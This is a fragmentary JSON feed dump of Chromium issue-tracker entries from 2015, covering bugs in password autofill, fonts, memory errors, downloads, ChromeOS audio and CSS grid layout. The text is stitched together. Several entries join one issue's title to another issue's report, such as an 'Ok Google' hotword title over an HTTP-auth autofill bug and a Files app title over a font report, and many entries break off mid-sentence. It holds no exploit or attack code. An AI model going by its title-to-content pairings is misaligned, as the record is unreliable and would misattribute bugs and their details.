candidates.","type":"html"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http://code.google.com/feeds/issues/p/chromium/issues/456228/comments/full"},{"rel":"alternate","type":"text/html","href":"http://code.google.com/p/chromium/issues/detail?id=456228"},{"rel":"self","type":"application/atom+xml","href":"https://code.google.com/feeds/issues/p/chromium/issues/full/456228"}],"author":[{"name":{"$t":"stan...@chromium.org"},"uri":{"$t":"/u/113457519553010092437/"}}],"issues$cc":[{"issues$uri":{"$t":"/u/113457519553010092437/"},"issues$username":{"$t":"stan...@chromium.org"}}],"issues$closedDate":{"$t":"2015-03-06T18:25:49.000Z"},"issues$id":{"$t":456228},"issues$label":[{"$t":"Type-Bug"},{"$t":"Pri-2"},{"$t":"Cr-Services-Sync"},{"$t":"OS-All"},{"$t":"M-42"},{"$t":"Hotlist-Merge-Review"},{"$t":"merge-merged-2311"}],"issues$owner":{"issues$uri":{"$t":"/u/113457519553010092437/"},"issues$username":{"$t":"stan...@chromium.org"}},"issues$stars":{"$t":3},"issues$state":{"$t":"closed"},"issues$status":{"$t":"Fixed"}},{"gd$etag":"W/\"C0QASH47eCl7ImA9XRRQEks.\"","id":{"$t":"http://code.google.com/feeds/issues/p/chromium/issues/full/456226"},"published":{"$t":"2015-02-06T19:33:32.000Z"},"updated":{"$t":"2015-02-06T22:22:29.000Z"},"title":{"$t":"\"Ok Google\" hotword detected despite chrome://flag being disabled"},"content":{"$t":"Chrome Version       :  Version 40.0.2214.111 (64-bit)\r\nURLs (if applicable) : N/A\r\nOther browsers tested: N/A as it is specifically a Chrome feature\r\n\u003cb\u003eAdd OK or FAIL after other browsers where you have tested this issue:\u003c/b\u003e\n     Safari 6: N/A\r\n  Firefox 20: N/A\r\n       IE 7/8/9/10: N/A\r\n\r\n\u003cb\u003eWhat steps will reproduce the problem?\u003c/b\u003e\n1.

Set up HTTP auth on a server with an empty realm string.\r\n2. Set up the server to also serve a HTML page with with a password form.\r\n3. Navigate to the page, input HTTP auth credentials, let Chrome save them.\r\n4. Reload the page with the HTML form.\r\n\r\nWhat is the expected output?\r\nChrome should not autofill the HTTP auth credentials in the HTML form.\r\n\r\nWhat do you see instead?\r\nIt does autofill those credentials.\r\n\r\n\r\nNote that the empty realm string is crucial. The credentials get matched in the password store by signon_realm. That consists of the origin without path and beyond for HTML forms, and of the origin without path + the realm string for HTTP auth forms. The only way to match them is to make the realm string empty, which is possible.\r\n\r\nThis does not seem to present too much of a security concerns, but can be confusing. We should never mix forms with different schemes.\r\n\r\nThe most straightforward idea seems to be to include the check for scheme in the PasswordStore methods for getting logins. We might be careful in cases when the store is asked to return all forms, in that case the burden of checking is probably with the caller (or the scheme needs to become an argument in the API). It might be that because of that, the PasswordStoreConsumer should be actually doing this check.","type":"html"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http://code.google.com/feeds/issues/p/chromium/issues/456158/comments/full"},{"rel":"alternate","type":"text/html","href":"http://code.google.com/p/chromium/issues/detail?id=456158"},{"rel":"self","type":"application/atom+xml","href":"https://code.google.com/feeds/issues/p/chromium/issues/full/456158"}],"author":[{"name":{"$t":"vabr@chromium.org"},"uri":{"$t":"/u/vabr@chromium.org/"}}],"issues$id":{"$t":456158},"issues$label":[{"$t":"Type-Bug"},{"$t":"Pri-2"},{"$t":"Cr-UI-Browser-Passwords"},{"$t":"OS-All"},{"$t":"Hotlist-GoodFirstBug"}],"issues$stars":{"$t":2},"issues$state":{"$t":"open"},"issues$status":{"$t":"Untriaged"}},{"gd$etag":"W/\"C0ANRX47eCl7ImA9XRRbEUw.\"","id":{"$t":"http://code.google.com/feeds/issues/p/chromium/issues/full/456157"},"published":{"$t":"2015-02-06T17:21:35.000Z"},"updated":{"$t":"2015-04-04T01:43:14.000Z"},"title":{"$t":"Files app in Chrome OS leaves un-ejectable .ZIP in left sidebar after file deleted"},"content":{"$t":"Chrome Version: 41.0.2272.41 (Official Build) beta\r\nChrome OS Version: 6680.24.0 (Official Build) beta-channel peppy\r\nChrome OS Platform: Acer C720P-2661\r\nNetwork info: Various networks and routers in various places\r\n\r\n\u003cb\u003ePlease specify Cr-* of the system to which this bug/feature applies (add\u003c/b\u003e\nthe label below): I'm a bit lost here on what's being asked for.\r\n\r\n\u003cb\u003eSteps To Reproduce:\u003c/b\u003e\nNote: I can't reproduce it now, but here's my best guess.\r\n1.

I imported a font using CSS font-face. The font used was 'Aller', which can be accessed via http://www.fontsquirrel.com/fonts/aller.\r\n2. I set the font-family to the newly created font.\r\n3. I use '&amp;nbsp;' to create a space after e.g. a 'span' element.\r\n\r\nWhat is the expected behavior?\r\nI expected that a space would be displayed to the left and right of the span-elements, which is where I use &amp;nbsp;.\r\n\r\nWhat went wrong?\r\nThe spaces are collapsed. This did not happen in older versions of chrome, but in the latest version it does. If I change the font to 'standard' font, e.g. Arial, the &amp;nbsp; is not collapsed.\r\nThe images show the difference between Chrome and IE.\r\n\r\nDoes it occur on multiple sites: N/A\r\n\r\nIs it a problem with a plugin? No \r\n\r\nDid this work before? Yes It worked in older versions of chrome, I cannot remember which version this was.\r\n\r\nDoes this work in other browsers? Yes \r\n\r\nChrome version: 40.0.2214.111  Channel: stable\r\nOS Version: 8.1\r\nFlash Version: Shockwave Flash 16.0 r0","type":"html"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http://code.google.com/feeds/issues/p/chromium/issues/456132/comments/full"},{"rel":"alternate","type":"text/html","href":"http://code.google.com/p/chromium/issues/detail?id=456132"},{"rel":"self","type":"application/atom+xml","href":"https://code.google.com/feeds/issues/p/chromium/issues/full/456132"}],"author":[{"name":{"$t":"scebber...@gmail.com"},"uri":{"$t":"/u/112157879805693476206/"}}],"issues$cc":[{"issues$uri":{"$t":"/u/pdr@chromium.org/"},"issues$username":{"$t":"pdr@chromium.org"}}],"issues$closedDate":{"$t":"2015-02-12T21:43:09.000Z"},"issues$id":{"$t":456132},"issues$label":[{"$t":"Pri-2"},{"$t":"Via-Wizard"},{"$t":"Type-Bug-Regression"},{"$t":"OS-All"},{"$t":"Cr-Blink-Layout"},{"$t":"M-40"},{"$t":"Cr-Blink-Fonts"}],"issues$owner":{"issues$uri":{"$t":"/u/eae@chromium.org/"},"issues$username":{"$t":"eae@chromium.org"}},"issues$stars":{"$t":4},"issues$state":{"$t":"closed"},"issues$status":{"$t":"WontFix"}},{"gd$etag":"W/\"DkUDSH47eCl7ImA9XRRQFUo.\"","id":{"$t":"http://code.google.com/feeds/issues/p/chromium/issues/full/456131"},"published":{"$t":"2015-02-06T15:42:11.000Z"},"updated":{"$t":"2015-02-10T13:17:59.000Z"},"title":{"$t":"buffer-overflow and user-after-free at NavigateToURL"},"content":{"$t":"http://build.chromium.org/p/chromium.memory.fyi/builders/Windows%20Content%20Browser%20%28DrMemory%20full%29%20%285%29/builds/3678\r\n\r\n[10/13] URLRequestInfoTest.RecordDownloadProgress (33697 ms)\r\n[ RUN      ] BrowserSideNavigationBrowserTest.BrowserInitiatedNavigations\r\n[3804:3264:0205/122206:3950054:INFO:legacy_render_widget_host_win.cc(156)] LegacyRenderWidgetHostHWND::OnGetObject message=61 w_param=0 l_param=-12 obj_id=4294967284 host_=00000000\r\n[3804:3264:0205/122207:3950475:INFO:legacy_render_widget_host_win.cc(129)] LegacyRenderWidgetHostHWND::Init hwnd=000D01B8\r\n[380:1424:0205/122220:3963876:ERROR:renderer_main.cc(205)] Running without renderer sandbox\r\n~~Dr.M~~\r\n~~Dr.M~~ Error #1: UNADDRESSABLE ACCESS of freed memory: reading 0x02e45fd4-0x02e45fd8 4 byte(s)\r\n~~Dr.M~~ # 0 content::NavigateToURL                                                     [content\\public\\test\\content_browser_test_utils.cc:68]\r\n~~Dr.M~~ # 1 content::BrowserSideNavigationBrowserTest_BrowserInitiatedNavigations_Test::RunTestOnMainThread [content\\browser\\browser_side_navigation_browsertest.cc:58]\r\n~~Dr.M~~ # 2 content::ContentBrowserTest::RunTestOnMainThreadLoop                       [content\\public\\test\\content_browser_test.cc:145]\r\n~~Dr.M~~ # 3 content::BrowserTestBase::ProxyRunTestOnMainThreadLoop                     [content\\public\\test\\browser_test_base.cc:295]\r\n~~Dr.M~~ # 4 content::ShellBrowserMainParts::PreMainMessageLoopRun                      [content\\shell\\browser\\shell_browser_main_parts.cc:152]\r\n~~Dr.M~~ # 5 content.dll!content::BrowserMainLoop::PreMainMessageLoopRun                [content\\browser\\browser_main_loop.cc:791]\r\n~~Dr.M~~ # 6 content.dll!base::internal::Invoker&lt;&gt;::Run                                 [base\\bind_internal.h:478]\r\n~~Dr.M~~ # 7 content.dll!content::StartupTaskRunner::RunAllTasksNow                     [content\\browser\\startup_task_runner.cc:45]\r\n~~Dr.M~~ # 8 content.dll!content::BrowserMainLoop::CreateStartupTasks                   [content\\browser\\browser_main_loop.cc:689]\r\n~~Dr.M~~ # 9 content.dll!content::BrowserMainRunnerImpl::Initialize                     [content\\browser\\browser_main_runner.cc:188]\r\n~~Dr.M~~ #10 ShellBrowserMain                                                           [content\\shell\\browser\\shell_browser_main.cc:22]\r\n~~Dr.M~~ #11 content::ShellMainDelegate::RunProcess                                     [content\\shell\\app\\shell_main_delegate.cc:268]\r\n~~Dr.M~~ #12 content.dll!content::RunNamedProcessTypeMain                               [content\\app\\content_main_runner.cc:411]\r\n~~Dr.M~~ #13 content.dll!content::ContentMainRunnerImpl::Run                            [content\\app\\content_main_runner.cc:803]\r\n~~Dr.M~~ #14 content.dll!content::ContentMain                                           [content\\app\\content_main.cc:19]\r\n~~Dr.M~~ #15 content::BrowserTestBase::SetUp                                            [content\\public\\test\\browser_test_base.cc:268]\r\n~~Dr.M~~ #16 content::ContentBrowserTest::SetUp                                         [content\\public\\test\\content_browser_test.cc:102]\r\n~~Dr.M~~ #17 testing::internal::HandleExceptionsInMethodIfSupported&lt;&gt;

Click Google plus share Option .I entered something in What's new box . 4 options there to add additions files(photos,link,video,event,poll)\r\n2. For all these option except photos and poll have a close button to go back to the initial window (Step 1) \r\n3. If i click photos option , displays the window for attaching photo .\r\n  a. At this moment i am thinking that I don't want to upload a photo and choose another option for adding additional files. Here i have no option for go back to initial share window. Only way for go back to initial window is to click reload option.\r\n  b. if i Continue with the Photo Upload option and I attached a new photo. Now the Screen cuts off. I can't View the bottom sections like share and cancel buttons. See attached. The Similar issue is with Poll option also\r\n\r\nIssue Tested with\r\nOS version : Windows 8\r\nInternet Explorer : Issue Found\r\nMozilla Fire Fox: Issue Found\r\nGoogle Chore : Issue Found\r\n\r\nI can't use this with any of the browsers I have. Basically I am a developer not a tester.

Go to the view source page for above mentioned URL\r\n2. Find this line: a href=&quot;http://8.xhcdn.com/key=TaXxEtQZZto,end=1423202946/data=7ACD036B/speed=150k/958248.mp4 and click the link.\r\n3. Wait for the download dialog to pop up and attempt to download\r\n4. Fail\r\n5. Go to the Chromium downloads page and see the unhelpful error message (unknown network error)\r\n6. Follow steps I will outline below to verify that cURL has no problem downloading the file.\r\n\r\nWhat is the expected behavior?\r\nShould download with no issues, or failing that, should report a meaningful error message. I.E. either an http code or something describing what the error looks like from Chromium's perspective ('timed out', ' too many packets dropped', 'bad protocol', or whatever).\r\n\r\nWhat went wrong?\r\nChromium consistently has issues downloading from xhamster.com on the internet connection I am currently using. The problem may occur with other sites as well - haven't tested yet. The connection in question is AT&amp;T ADSL U-VERSE over copper wire. When this issue occurs Chromium's error message is always unhelpful, making it difficult to figure out the cause of the issue. Since I cannot reproduce the problem using cURL, the issue may just be with Chromium.\r\n\r\nDid this work before? N/A \r\n\r\nChrome version: 40.0.2214.91  Channel: beta\r\nOS Version: \r\nFlash Version: Shockwave Flash 16.0 r0\r\n\r\nTo verify that this works with cURL:\r\n\r\n$ curl -v http://8.xhcdn.com/key=TaXxEtQZZto,end=1423202946/data=7ACD036B/speed=150k/958248.mp4\r\n\r\ncURL will then output on one of its lines &quot;http/1.1 302 found&quot; indicating that the server is spitting out a redirect which cURL will not follow automatically (there may be a command line switch for this). If chromium receives the same redirect sent to curl, then it must be successfully following it, because it will download about 20+ MB of the file before it gets the &quot;unknown&quot; network error.\r\n\r\nA separate line of cURL output, the second to last line of output on the instance I ran, will look something like this:\r\n\r\n  Location: http://213.174.149.42/key=gga2A7CrNWw,end=1423201353/data=bOE2,7ACD036B/speed=150000/buffer=750000/reftag=5412162/11/21/3/2316573/958248.mp4\r\n\r\nThe exact URL may vary between runs, but taking this URL and feeding it to cURL resulted in a download which I was able to verify as successful.\r\n\r\nI can't prove it, because I'm not logging my packets, but it seems to me that chromium received the same redirect that cURL did, traversed it successfully, started downloading and continued downloading for about 20 MB before choking on the unknown error. It could also be that the server detected chromium and deliberately caused an error. Diagnosing the problem might well be a triviality if chromium would produce a helpful error message. Instead it would require me to log my packets and do an analysis with Wireshark or some similar \r\nanalysis tool, which is far too much trouble for most people.

However, as this API is used extensively, I am concerned about performance implications of the additional string copies.\r\n\r\n[1] https://groups.google.com/a/chromium.org/d/topic/chromium-dev/CIGwE3WcErA/discussion\r\n[2] https://code.google.com/p/chromium/codesearch#chromium/src/net/http/http_stream_factory_impl.cc&amp;l=30","type":"html"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http://code.google.com/feeds/issues/p/chromium/issues/455944/comments/full"},{"rel":"alternate","type":"text/html","href":"http://code.google.com/p/chromium/issues/detail?id=455944"},{"rel":"self","type":"application/atom+xml","href":"https://code.google.com/feeds/issues/p/chromium/issues/full/455944"}],"author":[{"name":{"$t":"mgiuca@chromium.org"},"uri":{"$t":"/u/mgiuca@chromium.org/"}}],"issues$blockedOn":[{"issues$id":{"$t":454274},"issues$project":{"$t":"chromium"}}],"issues$cc":[{"issues$uri":{"$t":"/u/pkasting@chromium.org/"},"issues$username":{"$t":"pkasting@chromium.org"}},{"issues$uri":{"$t":"/u/brettw@chromium.org/"},"issues$username":{"$t":"brettw@chromium.org"}},{"issues$uri":{"$t":"/u/117088883005658624950/"},"issues$username":{"$t":"sulli...@chromium.org"}}],"issues$id":{"$t":455944},"issues$label":[{"$t":"OS-All"},{"$t":"Type-Bug"},{"$t":"Pri-3"},{"$t":"Cr-Internals"}],"issues$owner":{"issues$uri":{"$t":"/u/mgiuca@chromium.org/"},"issues$username":{"$t":"mgiuca@chromium.org"}},"issues$stars":{"$t":1},"issues$state":{"$t":"open"},"issues$status":{"$t":"Assigned"}},{"gd$etag":"W/\"Dk8BSH47eCl7ImA9XRRQEUU.\"","id":{"$t":"http://code.google.com/feeds/issues/p/chromium/issues/full/455943"},"published":{"$t":"2015-02-05T23:58:57.000Z"},"updated":{"$t":"2015-02-06T01:07:39.000Z"},"title":{"$t":"Crashed render frames leave lingering power save blockers."},"content":{"$t":"It looks like RenderFrameDeleted() is not (no longer?) called when a render frame crashes, so power save blockers are not cleaned up during a renderer crash.\r\n\r\nThis is bad because it will result in lingering power save blockers which will prevent the system from suspending and resuming correctly.\r\n\r\nPer creis@: &quot;Hmm, it sounds like we should fix the fact that RenderFrameDeleted isn't being called.

This would allow us to set the APN as needed to control Chromebook internet access when the student is at home using a wireless card inserted into the Chromebook.\r\n\r\n2) Current Functionality: As of ChromeOS versions 38-39 the AccessPointName appears to be assigned to a user. The value needs to be manually set by each user logging into the Chromebook. In version 40 of ChromeOS, APN configuration assigned to user is lost.\r\n\r\n3) Desired Functionality: The AccessPointName can be preconfigured and set by OU through the Admin Console not only to users but also to devices with the required/assigned value, removing the need for the user to manually enter the value.\r\n\r\n4) Number of Users Impacted: Currently 560 and expect this to increase and potentially any customers of Kajeet\r\n\r\n5) The business need for this feature to be implemented (in terms of impact on revenue, costs, or employee productivity): Just increases the complexity of using a Chromebook at home for our students.

Load the attached extension (after unpacking)\r\n2. Load a static page (one that will not cause repaints) - the following appear to be sufficient (on my machine):\r\n    http://pim.vermeyden.com\r\nor https://developer.chrome.com/extensions/tabs#method-executeScript\r\n3. Click on the Browser Action button - but do not otherwise interact with the window *at all*\r\n\r\nWhat is the expected behavior?\r\nPage should become red.\r\n\r\nThe Browser Action button triggers an executeScript, which injects the red.js file - which will then create a &lt;link&gt; tag to the red.css file that contains the styles for the subsequently appended &lt;div&gt; tag so that it takes over the whole page.\r\n\r\nWhat went wrong?\r\nNothing appears to update (to a naive end-user).\r\nAny further interaction *on the page* will update it (such as moving the cursor over the page). I'm unsure, but I believe pages \r\n\r\nFrom what I can tell - there appears to be a race condition (?) between the re-render of the page and the application of styles from the added &lt;link&gt; tag.\r\n\r\nWebStore page: Not yet applicable - see attached for a sample extension\r\n\r\nDid this work before? N/A \r\n\r\nChrome version: 40.0.2214.94  Channel: stable\r\nOS Version: OS X 10.9.5\r\nFlash Version: Shockwave Flash 16.0 r0\r\n\r\nPages which are repainting themselves outside of user intervention do not have this issue (for instance, http://www.zombo.com/).\r\nAdditionally - the original &quot;make page red&quot; example extension does not have this issue, since it modifies the body styles directly.\r\n\r\n===\r\n\r\nThere are several workarounds to this issue - so I consider it (in my humble opinion) to be rather non-critical.\r\n\r\nWorkarounds:\r\n1. Make the style definitions directly, instead of in a &lt;link&gt; tag.\r\n2. Call something that forces a re-paint (it appears accessing the window.scrollY property is sufficient) after the &lt;link&gt; is loaded.\r\n\r\n===\r\n\r\nMy rationale for the approach used in the attached extension was so that if the user clicked the button multiple times for the same tab, the CSS would only be injected once (I don't do this check in the attached extension, but it's trivial to add a flag on the window and then conditionally insert the link tag).","type":"html"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http://code.google.com/feeds/issues/p/chromium/issues/455851/comments/full"},{"rel":"alternate","type":"text/html","href":"http://code.google.com/p/chromium/issues/detail?id=455851"},{"rel":"self","type":"application/atom+xml","href":"https://code.google.com/feeds/issues/p/chromium/issues/full/455851"}],"author":[{"name":{"$t":"pim2...@gmail.com"},"uri":{"$t":"/u/104005380382895051865/"}}],"issues$cc":[{"issues$uri":{"$t":"/u/adamk@chromium.org/"},"issues$username":{"$t":"adamk@chromium.org"}},{"issues$uri":{"$t":"/u/105364677282848801872/"},"issues$username":{"$t":"sh...@chromium.org"}},{"issues$uri":{"$t":"/u/rdevlin.cronin@chromium.org/"},"issues$username":{"$t":"rdevlin.cronin@chromium.org"}}],"issues$id":{"$t":455851},"issues$label":[{"$t":"Cr-Platform-Extensions"},{"$t":"Pri-2"},{"$t":"Via-Wizard"},{"$t":"Type-Bug"},{"$t":"OS-Mac"}],"issues$stars":{"$t":1},"issues$state":{"$t":"open"},"issues$status":{"$t":"Available"}},{"gd$etag":"W/\"CEYBRX47eCl7ImA9XRRWFkk.\"","id":{"$t":"http://code.google.com/feeds/issues/p/chromium/issues/full/455850"},"published":{"$t":"2015-02-05T20:31:15.000Z"},"updated":{"$t":"2015-03-06T11:42:34.000Z"},"title":{"$t":"Use

This meant that we had to maintain fts2 ourselves.

Go to http://google.com\r\n2. Drag the browser window so that the Google search homepage is offscreen, then drag the browser window back to the center of the screen.\r\n3. Notice that all colors are slightly darker, most noticeably the Google logo, the border of the search box, and the &quot;Google Search&quot; and &quot;I'm Feeling Lucky&quot; buttons.\r\n4. Move the mouse over the search box - the colors suddenly shift back to normal.\r\n5. Now open the Developer Tools for http://google.com.  Bring the Developer Tools window to the front, and then click on the browser window to bring http://google.com to the front.

Sometime the first attempt works, sometimes the first attempt works but fail the second.\r\n\r\n\r\n2. boot up and login right away (within 3 seconds after password text box shows):\r\n\r\ncras_test_client --playback /usr/local/autotest/cros/audio/pad_sweep_pad_16.raw  ----&gt; no sound\r\n\r\nThis can be reproduced quite reliably. I tried 10/10.\r\n\r\n3. boot up and wait 10 seconds to type password and login:\r\n\r\ncras_test_client --playback /usr/local/autotest/cros/audio/pad_sweep_pad_16.raw  ----&gt; works\r\n\r\nThis can be reproduced quite reliably. I tried 10/10.\r\n\r\n4. boot up and type password as soon as the input text box shows up, but press enter after 10 seconds.\r\n\r\ncras_test_client --playback /usr/local/autotest/cros/audio/pad_sweep_pad_16.raw  ----&gt; works\r\n\r\nThis can be reproduced quite reliably. I tried 10/10.\r\n\r\n\r\nwhen issue happens, these two methods can bring audio back reliably:\r\n\r\n1. select different node and select back\r\ncras_test_client --select_output 4:2  (select to hdmi node)\r\ncras_test_client --select_output 4:1   (select back to speaker node)\r\nThen it works.\r\n\r\n\r\n2. restart ui (with or without login, no matter how long the delay in login screen)\r\n\r\ncras_test_client --playback /usr/local/autotest/cros/audio/pad_sweep_pad_16.raw ---&gt; works\r\n\r\n\r\nBtw, this seems not a driver issue, since bypass cras can work\r\nstop cras\r\naplay -D hw:0,0 -f dat /usr/local/autotest/cros/audio/pad_sweep_pad_16.raw ---&gt; works\r\n\r\n\r\nJudging from the reproduce scenario 3 and 4, it seems that on boot up login screen, if chrome stays for too short in the login screen, chrome will do something that makes cras fail to use the output node.\r\n\r\nI have never seen this kind of behavior before.\r\nDylan do you have any idea ?\r\n\r\nHi Mussa, could you please verify that you can get the same result using my test scenario?\r\n\r\nOn the other hand, it seems that it is very hard to reproduce issue 453560 on peach_pit. The comment in https://code.google.com/p/chromium/issues/detail?id=453560#c23 I wrote probably was this issue actually. It is hard to say if this is related to issue 453560 because they have different behavior. In 453560 only 48000 audio from chrome fail, cras itself is fine.\r\n\r\n\r\nI am going to take a closer look in cras (bisect cras, add log level...) tomorrow if this is actually a valid bug (no likely to be the problem of my peach_pit?).\r\n\r\n","type":"html"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http://code.google.com/feeds/issues/p/chromium/issues/455751/comments/full"},{"rel":"alternate","type":"text/html","href":"http://code.google.com/p/chromium/issues/detail?id=455751"},{"rel":"self","type":"application/atom+xml","href":"https://code.google.com/feeds/issues/p/chromium/issues/full/455751"}],"author":[{"name":{"$t":"cychi...@chromium.org"},"uri":{"$t":"/u/107712306747122730767/"}}],"issues$cc":[{"issues$uri":{"$t":"/u/115170700037126484849/"},"issues$username":{"$t":"dgr...@chromium.org"}},{"issues$uri":{"$t":"/u/103268649670576978488/"},"issues$username":{"$t":"chin...@chromium.org"}},{"issues$uri":{"$t":"/u/113087974153332286582/"},"issues$username":{"$t":"conra...@chromium.org"}},{"issues$uri":{"$t":"/u/104438591060734961797/"},"issues$username":{"$t":"hyc...@chromium.org"}},{"issues$uri":{"$t":"/u/115099870155056553775/"},"issues$username":{"$t":"ka...@chromium.org"}}],"issues$id":{"$t":455751},"issues$label":[{"$t":"Type-Bug"},{"$t":"Pri-1"},{"$t":"Cr-OS-Kernel-Audio"},{"$t":"OS-Chrome"},{"$t":"M-44"},{"$t":"MovedFrom-43"}],"issues$owner":{"issues$uri":{"$t":"/u/107712306747122730767/"},"issues$username":{"$t":"cychi...@chromium.org"}},"issues$stars":{"$t":2},"issues$state":{"$t":"open"},"issues$status":{"$t":"Assigned"}},{"gd$etag":"W/\"AkAHR347eCl7ImA9XRRQEUg.\"","id":{"$t":"http://code.google.com/feeds/issues/p/chromium/issues/full/455750"},"published":{"$t":"2015-02-05T16:28:55.000Z"},"updated":{"$t":"2015-02-05T17:52:16.000Z"},"title":{"$t":"Clean-up

tracks (i.e. &quot;minmax(min-content, max-content) minmax(min-content, max-content)&quot;)\r\nItem 1 is in track 1, and has min-content = max-content = 10.\r\nItem 2 spans tracks 1 and 2, and has min-content = 30, max-content = 100.\r\n\r\nAfter resolving min-content/max-content for the first item, we have this.\r\n\r\ntrack 1:\r\n\tused breadth = 10\r\n\tmax breadth = 10\r\n\r\ntrack 2:\r\n\tused breadth = 0\r\n\tmax breadth = infinity\r\n\r\nThen we resolve min-content/max-content for the second item.\r\n\r\nPhase 1 sets the used breadth of track 2 to 20 so that the two tracks' used breadths sum to 30.\r\nPhase 2 does nothing because there are no relevant tracks.\r\nPhase 3 sets the max breadth of track 2 to 20 so that the two tracks' max breadths sum to 30.\r\nIn phase 4, we need to grow the sum of the max breadths by 70 to accommodate item 2.  Two options are:\r\n\t1. Grow each track's max breadth equally, and end up with max breadths = [45, 55].\r\n\t2. Grow only the second track's max breadth, and end up with max breadths = [10, 90].\r\n\r\nBy not considering the just-set max breadth as a constraint during space distribution (i.e. by treating it as infinity), we get the second result, which we considered a better result because the first track remains sized exactly to the first item.  In this example[1] which uses the IE10 syntax, each of the three elements (item 1, item 2, and the grid) is no bigger than it needs to be.\r\n","type":"html"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http://code.google.com/feeds/issues/p/chromium/issues/455724/comments/full"},{"rel":"alternate","type":"text/html","href":"http://code.google.com/p/chromium/issues/detail?id=455724"},{"rel":"self","type":"application/atom+xml","href":"https://code.google.com/feeds/issues/p/chromium/issues/full/455724"}],"author":[{"name":{"$t":"svil...@igalia.com"},"uri":{"$t":"/u/112116988028787682718/"}}],"issues$blocking":[{"issues$id":{"$t":79180},"issues$project":{"$t":"chromium"}},{"issues$id":{"$t":392200},"issues$project":{"$t":"chromium"}}],"issues$cc":[{"issues$uri":{"$t":"/u/116111427588863237888/"},"issues$username":{"$t":"r...@igalia.com"}},{"issues$uri":{"$t":"/u/116826301333690632146/"},"issues$username":{"$t":"jfernan...@igalia.com"}},{"issues$uri":{"$t":"/u/jchaffraix@chromium.org/"},"issues$username":{"$t":"jchaffraix@chromium.org"}}],"issues$id":{"$t":455724},"issues$label":[{"$t":"Type-Bug"},{"$t":"Pri-2"},{"$t":"Cr-Blink-Layout-Grid"},{"$t":"OS-All"}],"issues$stars":{"$t":1},"issues$state":{"$t":"open"},"issues$status":{"$t":"Assigned"}},{"gd$etag":"W/\"DEYGQ347eCl7ImA9XRRaEE8.\"","id":{"$t":"http://code.google.com/feeds/issues/p/chromium/issues/full/455722"},"published":{"$t":"2015-02-05T14:56:20.000Z"},"updated":{"$t":"2015-04-14T15:42:02.000Z"},"title":{"$t":"Feedback for impossible overscroll navigation"},"content":{"$t":"We should add an animation to serve as user feedback when they try to overscroll and there is no available history to navigate to.

The credential looks like other saved passwords, including some details of the originating form (like which URL it came from), only instead of the password itself it has a blacklist bit set on.\r\n\r\nThis blacklist credential is taken into account when retrieving relevant passwords to autofill, and goes through the same ranking that these passwords do. The blacklist password entry matches the form it originates from perfectly, but it also can match to some extent other forms on the same host. This leads to the blacklist being applied sometimes to just a single form, sometimes to a whole host, depending on whether the user has stored passwords on other forms on that host. Consider this experiment:\r\n\r\nSetup\r\nSome webserver serves 4 files: twin_a.html and twin_b.html, which each contain a password form. The files are exact copies of each other.\r\n\r\n1st branch of the experiment\r\n(0. Delete all potentially saved passwords for the webserver.)\r\n1. The user submits a password through twin_a.html.\r\n2. When Chrome asks about saving it, the user selects &quot;Never&quot;.\r\n3. The user submits a password through twin_b.html.\r\n4. Chrome does not offer to save that password, because the blacklist from step 2. is matching partially twin_b.html, and there is no better match among the stored passwords.\r\n\r\n2nd branch of the experiment, which swaps the order of steps 1. and 3. from the 1st branch, and achieves a very different result.\r\n(0. Delete all potentially saved passwords for the webserver.)\r\n1. The user submits a password through twin_b.html.\r\n2. When Chrome asks about saving it, the user selects &quot;Save&quot;.\r\n3. The user submits a password through twin_a.html.\r\n4. When Chrome asks about saving it, the user selects &quot;Never&quot;.\r\n5. The user goes back to twin_b.html. The password manager is not disabled, autofills the password from step 2., and allows saving more passwords on twin_b.html. This is because the password saved in step 2. is a better match for the form in twin_b.html than the blacklisted entry from step 4.\r\n\r\nIt can be argued that this is WAI, because in the 1st branch it is safe to assume that the user does not want Chrome to save credentials for that particular webserver (especially if it is because of security concerns or lack of trust, for which the host origin of the credentials may be more important than which form they came from), whereas in the 2nd branch the user explicitly decided to save passwords for one form, and not for another.\r\n\r\nHowever, there are some objections:\r\nA. It is inconsistent. In both cases, the user agrees to &quot;never save password for this site&quot;, but in each case &quot;this site&quot; means another thing.\r\nB. There are valid cases when the user might want to disable saving passwords for a specific form (typically when Chrome mistakes a non-login form for one). It is possible to do so now (see 2nd experiment branch above), but one has to know the &quot;trick&quot;. Chrome should either offer this functionality or not, without making the user jump through hoops.\r\n\r\nThe purpose of this bug is to document this issue, and track the team's discussion about addressing it (by fixing the scope of a blacklist to a form, a page, a host, or at least knowingly ignore the issue for a good reason).","type":"html"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http://code.google.com/feeds/issues/p/chromium/issues/455701/comments/full"},{"rel":"alternate","type":"text/html","href":"http://code.google.com/p/chromium/issues/detail?id=455701"},{"rel":"self","type":"application/atom+xml","href":"https://code.google.com/feeds/issues/p/chromium/issues/full/455701"}],"author":[{"name":{"$t":"vabr@chromium.org"},"uri":{"$t":"/u/vabr@chromium.org/"}}],"issues$id":{"$t":455701},"issues$label":[{"$t":"Type-Bug"},{"$t":"Pri-3"},{"$t":"Cr-UI-Browser-Passwords"},{"$t":"OS-All"}],"issues$stars":{"$t":2},"issues$state":{"$t":"open"},"issues$status":{"$t":"Untriaged"}},{"gd$etag":"W/\"CEINSH47eCl7ImA9XRRUEUQ.\"","id":{"$t":"http://code.google.com/feeds/issues/p/chromium/issues/full/455700"},"published":{"$t":"2015-02-05T13:51:11.000Z"},"updated":{"$t":"2015-03-24T10:23:19.000Z"},"title":{"$t":"Crash occurs after user hits enter/backspace on a paragraph containing a picture.

